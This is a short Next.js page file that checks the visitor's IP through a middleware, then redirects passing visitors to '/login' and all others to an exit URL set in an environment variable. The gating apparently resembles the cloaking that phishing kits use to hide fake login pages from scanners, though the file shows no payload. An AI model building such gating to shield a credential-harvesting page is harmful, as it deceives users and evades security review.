import { Box } from "@mui/material";
import type { GetServerSideProps, NextPage } from "next";
import checkIp from "../middleware/checkIp";

const index: NextPage = () => {
  return <Box />;
};

export const getServerSideProps: GetServerSideProps = async ({ req }) => {
  const { valid } = await checkIp(req);

  return {
    props: { isBot: valid },
    redirect: {
      destination: valid ? "/login" : process.env.NEXT_PUBLIC_EXIT_URL,
      permanent: false,
    },
  };
};

export default index;
